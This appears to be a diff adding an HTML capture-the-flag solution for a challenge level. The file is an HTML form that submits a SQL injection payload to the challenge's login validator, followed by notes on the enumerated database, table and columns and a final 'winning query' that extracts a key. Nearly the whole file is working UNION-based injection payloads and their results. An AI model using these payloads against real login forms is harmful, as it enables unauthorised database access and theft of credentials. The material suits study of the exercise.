@@ -1,0 +1,21 @@
+<form action="https://cctc-3.cloudapp.net/cctc/level-5/validate.php" method="POST">
+	<textarea rows="10" cols="200" name="username">doctor' UNION SELECT 1,(SELECT column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT 0,1),3 #</textarea><br><br>
+	<input name="password" type="hidden" value=".">
+	<input type="submit" value="execute">
+</form>
+
+<br>
+<pre>
+	db = cctc_exploit_db
+	tables = 
+		k_e_y_s=
+			id
+			user_key
+
+
+
+answer was in the 9th user_key
+
+winning query:
+
+ doctor' UNION SELECT 1,(SELECT user_key from k_e_y_s LIMIT 9,1),3 #
